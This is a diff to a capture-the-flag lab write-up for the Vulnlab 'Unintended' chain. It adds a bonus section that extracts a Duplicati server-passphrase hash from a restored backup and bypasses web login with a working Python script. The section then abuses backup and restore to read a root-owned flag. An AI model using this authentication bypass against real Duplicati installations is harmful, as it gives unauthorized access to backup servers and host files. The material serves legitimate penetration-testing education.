@@ -1539,7 +1539,7 @@ Successfully copied 1.66MB to /home/abbie@unintended.vl/.
 ```
 
 ```shell-session
-└─$ sshpass -p Hiu8sy8SA8h2 scp abbie@unintended.vl@backup.unintended.vl:samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .  
+└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:samba-backup-2024-02-17T20-32-13.580437.tar.bz2 .  
 ```
 
 Extract the backup:
@@ -1737,5 +1737,473 @@ SMB         10.10.143.229   445    DC               [+] File "root.txt" was down
 
 ```shell-session
 └─$ cat root.txt
+VL{...}
+```
+
+## (Bonus) Root on WEB
+
+There's a third user flag that involves getting root on WEB (target 2) and that I didn't get by myself at the time. Thanks to the Discord's master channel I was able to understand and reproduce other people's method. It consists of extracting the Duplicati server passphrase from a backup, logging in to the web interface and creating a malicious backup and restore. I will show the detailed process here.
+
+### Extracting the Duplicati server passphrase
+
+First transfer the Duplicati backup we found on target 3 to our attack host:
+
+```shell-session
+abbie@unintended.vl@backup:~$ docker exec -it scripts_ftp_1 bash
+root@ftp:/ftp# 
+```
+
+```shell-session
+root@ftp:/ftp/volumes# ls docker_src/
+duplicati-20240125T071045Z.dlist.zip            duplicati-ba27818c8bd7a4ea6a506fde8314c48d1.dblock.zip  duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
+duplicati-b71dd219377964328aa2c79f4bc7354a5.dblock.zip  duplicati-i48680ba57a084652a109d584aebc63a9.dindex.zip
+duplicati-b9d86c254096f4531b0be8e536a59ff07.dblock.zip  duplicati-i570def036a8d475c9ec47b861bee206a.dindex.zip
+```
+
+```shell-session
+root@ftp:/ftp/volumes# tar -zcf docker_src.tar.gz docker_src/
+```
+
+```shell-session
+abbie@unintended.vl@backup:~$ docker cp scripts_ftp_1:/ftp/volumes/docker_src.tar.gz .
+Successfully copied 142MB to /home/abbie@unintended.vl/.
+```
+
+```shell-session
+└─$ sshpass -p <ABBIE_PASS> scp abbie@unintended.vl@backup.unintended.vl:~/docker_src.tar.gz .
+```
+
+```shell-session
+└─$ tar -zxf docker_src.tar.gz && rm docker_src.tar.gz
+```
+
+We can use [this script](https://github.com/duplicati/duplicati/tree/master/Tools/Commandline/RestoreFromPython) to restore the backup from Linux without having to install Duplicati.
+
+```shell-session
+└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/ijson.py
+```
+
+```shell-session
+└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/pyaescrypt.py
+```
+
+```shell-session
+└─$ wget https://github.com/duplicati/duplicati/raw/master/Tools/Commandline/RestoreFromPython/restore_from_python.py
+```
+
+```shell-session
+└─$ mkdir restore
+```
+
+```shell-session
+└─$ python3 restore_from_python.py
+Welcome to Python Duplicati recovery.
+Please type the full path to a directory with Duplicati's .aes or .zip files:./docker_src
+Please type * to restore all files, or a pattern like /path/to/files/* to restore the files in a certain directory)*
+Please enter the path to an empty destination directory:restore
+...
+```
+
+There will be a lot of errors and it will take a while but the files will be restored correctly.
+
+```shell-session
+└─$ ls restore/source/root/scripts/
+apache  docker-compose.yml  duplicati  gitea  mattermost  mysql  web
+```
+
+We find the database of the Duplicati server:
+
+```shell-session
+└─$ tree restore/source/root/scripts/duplicati                      
+restore/source/root/scripts/duplicati
+└── config
+    ├── control_dir_v2
+    │   └── lock_v2
+    ├── Duplicati-server.sqlite
+    ├── IRFTMLEYVT.sqlite
+    └── IRFTMLEYVT.sqlite-journal
+
+3 directories, 4 files
+```
+
+In the database we find some interesting entries like the `server-passphrase`.
+
+```shell-session
+└─$ sqlite3 restore/source/root/scripts/duplicati/config/Duplicati-server.sqlite
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+sqlite> .tables
+Backup        Log           Option        TempFile
+ErrorLog      Metadata      Schedule      UIStorage
+Filter        Notification  Source        Version
+sqlite> select * from Option;
+-2||startup-delay|0s
+-2||max-download-speed|
+-2||max-upload-speed|
+-2||thread-priority|
+-2||last-webserver-port|8200
+-2||is-first-run|
+-2||server-port-changed|True
+-2||server-passphrase|ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk=
+-2||server-passphrase-salt|j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
+-2||server-passphrase-trayicon|4f760941-ce8f-4e03-b427-a92319d6d763
+-2||server-passphrase-trayicon-hash|VHwBLiNdg/D545Utf8j67DSvqTvBmhpJIWzWmJCiV3o=
+-2||last-update-check|638417625259706730
+-2||update-check-interval|
+-2||update-check-latest|
+-2||unacked-error|
+-2||unacked-warning|
+-2||server-listen-interface|any
+-2||server-ssl-certificate|
+-2||has-fixed-invalid-backup-id|True
+-2||update-channel|
+-2||usage-reporter-level|
+-2||has-asked-for-password-protection|true
+-2||disable-tray-icon-login|false
+-2||allowed-hostnames|*
+1||encryption-module|
+1||compression-module|zip
+1||dblock-size|50mb
+1||--no-encryption|true
+1||retention-policy|1W:1D,4W:1W,12M:1M
+sqlite> .quit
+```
+
+### Login to Duplicati
+
+It turns out that we can login to the web interface by knowing the `server-passphrase`. There's an [article](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) published just after the chain's release that explains the attack. I highly recommend to read it first.
+
+Let's try to understand the attack in more detail and why it works.
+
+Using Burp Suite we can inspect requests sent when we try to login at <http://web.unintended.vl:8200/login.html> with any password.
+
+First it gets a nonce from the server:
+
+```
+POST /login.cgi HTTP/1.1
+Host: web.unintended.vl:8200
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 11
+Origin: http://web.unintended.vl:8200
+DNT: 1
+Connection: close
+Referer: http://web.unintended.vl:8200/login.html
+Cookie: xsrf-token=uVr84ltXrj1xJ8shYnhZUF41%2B%2BydyzIUqXPLqvbZFO0%3D
+
+get-nonce=1
+
+HTTP/1.1 200 OK
+Cache-Control: no-cache, no-store, must-revalidate, max-age=0
+Date: Thu, 02 May 2024 01:01:18 GMT
+Content-Length: 140
+Content-Type: application/json
+Server: Tiny WebServer
+Connection: close
+Set-Cookie: session-nonce=2ZsSuaEaB77wEMO878o2K5t%2BE1n4R5JE0DgQ0scpnlE%3D; expires=Thu, 02 May 2024 01:11:18 GMT;path=/; 
+
+﻿{
+  "Status": "OK",
+  "Nonce": "2ZsSuaEaB77wEMO878o2K5t+E1n4R5JE0DgQ0scpnlE=",
+  "Salt": "j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w="
+}
+```
+
+Then the `password` is likely generated and sent based on the nonce and the value we entered in the form:
+
+```
+POST /login.cgi HTTP/1.1
+Host: web.unintended.vl:8200
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 57
+Origin: http://web.unintended.vl:8200
+DNT: 1
+Connection: close
+Referer: http://web.unintended.vl:8200/login.html
+Cookie: xsrf-token=uVr84ltXrj1xJ8shYnhZUF41%2B%2BydyzIUqXPLqvbZFO0%3D; session-nonce=2ZsSuaEaB77wEMO878o2K5t%2BE1n4R5JE0DgQ0scpnlE%3D
+
+password=tr3sWKfzgne4V7zlm43NHYmq%2BwiKhJSBbijmNkMsH4A%3D
+
+HTTP/1.1 401 Unauthorized
+Date: Thu, 02 May 2024 01:01:19 GMT
+Content-Length: 0
+Content-Type: application/json
+Server: Tiny WebServer
+Connection: close
+```
+
+This is how the `password` sent to `login.cgi` is actually generated:
+
+<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati/Server/webroot/login/login.js>
+
+```cs
+// First we grab the nonce and salt
+$.ajax({
+	url: './login.cgi',
+	type: 'POST',
+	dataType: 'json',
+	data: {'get-nonce': 1}
+})
+.done(function(data) {
+	var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));
+
+	var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
+
+	$.ajax({
+		url: './login.cgi',
+		type: 'POST',
+		dataType: 'json',
+		data: {'password': noncedpwd }
+	})
+```
+
+First `saltedpwd` is the SHA256 hash of the password entered by the user concatenated with the salt. Then `noncedpwd` is the SHA256 hash of the nonce concatenated with `saltedpwd`, which is then sent as the `password` parameter to `login.cgi`.
+
+Next, this is where `server-passphrase` is used:
+
+<https://github.com/duplicati/duplicati/blob/e927e7230dc5806990614235dca2d64073fd43aa/Duplicati.Library.RestAPI/Database/ServerSettings.cs#L39>
+
+```cs
+public const string SERVER_PASSPHRASE = "server-passphrase";
+```
+
+<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati.Library.RestAPI/Database/ServerSettings.cs>
+
+```cs
+public string WebserverPassword
+{
+	get 
+	{
+		return settings[CONST.SERVER_PASSPHRASE];
+	}
+}
+...
+public void SetWebserverPassword(string password)
+{
+	if (string.IsNullOrWhiteSpace(password))
+	{
+		lock(databaseConnection.m_lock)
+		{
+			settings[CONST.SERVER_PASSPHRASE] = "";
+			settings[CONST.SERVER_PASSPHRASE_SALT] = "";
+		}
+	}
+	else
+	{
+		var prng = RandomNumberGenerator.Create();
+		var buf = new byte[32];
+		prng.GetBytes(buf);
+		var salt = Convert.ToBase64String(buf);
+
+		var sha256 = System.Security.Cryptography.SHA256.Create();
+		var str = System.Text.Encoding.UTF8.GetBytes(password);
+
+		sha256.TransformBlock(str, 0, str.Length, str, 0);
+		sha256.TransformFinalBlock(buf, 0, buf.Length);
+		var pwd = Convert.ToBase64String(sha256.Hash);
+
+		lock(databaseConnection.m_lock)
+		{
+			settings[CONST.SERVER_PASSPHRASE] = pwd;
+			settings[CONST.SERVER_PASSPHRASE_SALT] = salt;
+		}
+	}
+
+	SaveSettings();
+}
+```
+
+`server-passphrase` is the SHA256 hash of the plaintext password concatenated with `server-passphrase-salt`. This matches the `saltedpwd` variable in `login.js`, with the exception that `saltedpwd` is in hex whereas `server-passphrase` is in Base64.
+
+Now let's see how `WebserverPassword` (i.e. `server-passphrase`) is used:
+
+<https://github.com/duplicati/duplicati/blob/67c1213a98e9f98659f3d4b78ded82b80ddab8bb/Duplicati.Library.RestAPI/WebServer/AuthenticationHandler.cs>
+
+```cs
+if (input["get-nonce"] != null && !string.IsNullOrWhiteSpace(input["get-nonce"].Value))
+{
+	if (m_activeNonces.Count > 50)
+	{
+		response.Status = System.Net.HttpStatusCode.ServiceUnavailable;
+		response.Reason = "Too many active login attempts";
+		return true;
+	}
+
+	var password = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPassword;
+
+	if (request.Headers[TRAYICONPASSWORDSOURCE_HEADER] == "database")
+		password = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPasswordTrayIconHash;
+	
+	var buf = new byte[32];
+	var expires = DateTime.UtcNow.AddMinutes(AUTH_TIMEOUT_MINUTES);
+	m_prng.GetBytes(buf);
+	var nonce = Convert.ToBase64String(buf);
+
+	var sha256 = System.Security.Cryptography.SHA256.Create();
+	sha256.TransformBlock(buf, 0, buf.Length, buf, 0);
+	buf = Convert.FromBase64String(password);
+	sha256.TransformFinalBlock(buf, 0, buf.Length);
+	var pwd = Convert.ToBase64String(sha256.Hash);
+
+	m_activeNonces.AddOrUpdate(nonce, key => new Tuple<DateTime, string>(expires, pwd), (key, existingValue) =>
+	{
+		// Simulate the original behavior => if the nonce, against all odds, is already used
+		// we throw an ArgumentException
+		throw new ArgumentException("An element with the same key already exists in the dictionary.");
+	});
+
+	response.Cookies.Add(new HttpServer.ResponseCookie(NONCE_COOKIE_NAME, nonce, expires));
+	using(var bw = new BodyWriter(response, request))
+	{
+		bw.OutputOK(new {
+			Status = "OK",
+			Nonce = nonce,
+			Salt = FIXMEGlobal.DataConnection.ApplicationSettings.WebserverPasswordSalt
+		});
+	}
+	return true;
+}
+else
+{
+	if (input["password"] != null && !string.IsNullOrWhiteSpace(input["password"].Value))
+	{
+		var nonce_el = request.Cookies[NONCE_COOKIE_NAME] ?? request.Cookies[Library.Utility.Uri.UrlEncode(NONCE_COOKIE_NAME)];
+		var nonce = nonce_el == null || string.IsNullOrWhiteSpace(nonce_el.Value) ? "" : nonce_el.Value;
+		var urldecoded = nonce == null ? "" : Duplicati.Library.Utility.Uri.UrlDecode(nonce);
+		if (m_activeNonces.ContainsKey(urldecoded))
+			nonce = urldecoded;
+
+		if (!m_activeNonces.ContainsKey(nonce))
+		{
+			response.Status = System.Net.HttpStatusCode.Unauthorized;
+			response.Reason = "Unauthorized";
+			response.ContentType = "application/json";
+			return true;
+		}
+
+		var pwd = m_activeNonces[nonce].Item2;
+
+		// Remove the nonce
+		m_activeNonces.TryRemove(nonce, out _);
+
+		if (pwd != input["password"].Value)
+		{
+			response.Status = System.Net.HttpStatusCode.Unauthorized;
+			response.Reason = "Unauthorized";
+			response.ContentType = "application/json";
+			return true;
+		}
+```
+
+We can see that the `password` (i.e. `noncedpwd`) sent to `login.cgi` is compared with the SHA256 hash of a randomly generated nonce concatenated with `WebserverPassword` (i.e. `server-passphrase`).
+
+This means that knowing `server-passphrase`, we can easily compute the correct `noncedpwd` to be able to login.
+
+We need to send a first request to `login.cgi` to get a nonce, then send a second request with the `password` parameter set as the SHA256 hash in Base64 of the nonce concatenated with `server-passphrase`.
+
+Here is a script to automate the attack, `duplicati-login.py`:
+
+```python
+import requests
+import base64
+import hashlib
+
+server_passphrase = 'ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk='
+
+s = requests.Session()
+
+s.get('http://web.unintended.vl:8200/login.html')
+
+r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
+    'get-nonce': 1
+}).json()
+nonce = r['Nonce']
+
+saltedpwd_bin = base64.b64decode(server_passphrase)
+noncedpwd = base64.b64encode(hashlib.sha256(base64.b64decode(nonce) + saltedpwd_bin).digest()).decode()
+
+r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
+    'password': noncedpwd
+})
+
+print(f'Status code: {r.status_code}')
+print(f'Cookies: {s.cookies}')
+```
+
+```shell-session
+└─$ python3 duplicati-login.py
+Status code: 200
+Cookies: <RequestsCookieJar[<Cookie xsrf-token=p4ORaHNTOvntwOf79tH1o%2Fq6SVaSupLvNmQiSN4hIs4%3D for web.unintended.vl/>, <Cookie session-nonce=6Q46SzvPaU%2BVeK37dOVnWp%2Fw8k8NJmVg6u0TqVqq9D8%3D for web.unintended.vl/>, <Cookie session-auth=QsSMl8sEoSVHVJgXCz0iLKUGtBqDDBe2kBCQyAYVBwI for web.unintended.vl/>]>
+```
+
+At <http://web.unintended.vl:8200/login.html> we now add or replace the cookie values to what the script gave us (make sure the path is set to `/`).
+
+![](/assets/vulnlab/chains/unintended/img/20.png)
+
+After navigating to <http://web.unintended.vl:8200/> again, we will successfully login!
+
+![](/assets/vulnlab/chains/unintended/img/21.png)
+
+### Read the flag with backup and restore
+
+Let's try to add a new backup:
+
+![](/assets/vulnlab/chains/unintended/img/22.png)
+
+![](/assets/vulnlab/chains/unintended/img/23.png)
+
+We notice that the root filesystem of the host is mounted at `/source` in the Duplicati container, allowing us to backup any files on the host to any location:
+
+![](/assets/vulnlab/chains/unintended/img/24.png)
+
+Let's backup `/source/root/flag.txt` to `/source/tmp/flag`:
+
+![](/assets/vulnlab/chains/unintended/img/25.png)
+
+![](/assets/vulnlab/chains/unintended/img/26.png)
+
+Leave default settings for *Schedule* and *Options*. 
+
+Click on *Run now* for the newly added backup:
+
+![](/assets/vulnlab/chains/unintended/img/27.png)
+
+After the backup runs, we can check the created files in a SSH session on WEB as juan:
+
+```shell-session
+juan@unintended.vl@web:~$ ls /tmp/flag
+duplicati-20240502T025339Z.dlist.zip  duplicati-ba1abdf89a9af488ebe1b800f48517ff7.dblock.zip  duplicati-i15ebd0d15d644e5d8e6e1212b840cc72.dindex.zip
+```
+
+Now click on *Restore files...*:
+
+![](/assets/vulnlab/chains/unintended/img/28.png)
+
+Restore the files (the flag) to `/source/tmp/flag`:
+
+![](/assets/vulnlab/chains/unintended/img/29.png)
+
+![](/assets/vulnlab/chains/unintended/img/30.png)
+
+![](/assets/vulnlab/chains/unintended/img/31.png)
+
+After the restore, we can read the flag:
+
+```shell-session
+juan@unintended.vl@web:~$ ls /tmp/flag
+duplicati-20240502T025339Z.dlist.zip  duplicati-ba1abdf89a9af488ebe1b800f48517ff7.dblock.zip  duplicati-i15ebd0d15d644e5d8e6e1212b840cc72.dindex.zip  flag.txt
+```
+
+```shell-session
+juan@unintended.vl@web:~$ cat /tmp/flag/flag.txt
 VL{...}
 ```
